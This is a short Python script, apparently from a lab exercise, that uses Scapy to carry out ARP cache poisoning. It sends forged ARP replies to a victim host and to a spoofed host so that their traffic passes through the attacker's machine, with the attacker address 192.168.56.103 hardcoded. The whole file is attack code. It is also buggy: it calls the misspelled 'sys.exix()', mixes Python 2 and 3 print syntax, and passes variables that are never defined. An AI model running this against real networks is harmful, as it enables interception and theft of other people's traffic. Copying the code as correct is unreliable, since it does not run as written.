from scapy.all import *
import util


attackerIP = "192.168.56.103"
networkInterface = "enp0s3"

def arpPoisoning(victimIP, spoofIP, networkInterface):
    attackerMAC = get_if_hwaddr(networkInterface)
    victimMAC = util.getMAC(victimIP, networkInterface)
    spoofMAC = util.getMAC(spoofIP, networkInterface)

    print  (attackerMAC ,victimMAC, spoofMAC)
    if spoofMAC==None or attackerMAC == None or victimMAC == None :
        print "Error occure! Attcker Mac : " +attackerMAC +"Victim Mac: " +victimMAC + "spoofing MAC :" +spoofMAC
        sys.exix()

    pktV = Ether() / ARP()
    pktV[Ether].src = attackerMAC
    pktV[ARP].hwsrc = attackerMAC
    pktV[ARP].psrc = spoofIP
    pktV[ARP].hwdst = victimMAC
    pktV[ARP].pdst = victimIP

    sendp(pktV, iface=networkInterface)

    pktS = Ether() / ARP()
    pktS[Ether].src = attackerMAC
    pktS[ARP].hwsrc = attackerMAC
    pktS[ARP].psrc = victimIP
    pktS[ARP].hwdst = spoofMAC
    pktS[ARP].pdst = spoofIP

    sendp(pktS, iface=networkInterface)

arpPoisoning(victimIP, spoofIP, networkInterface)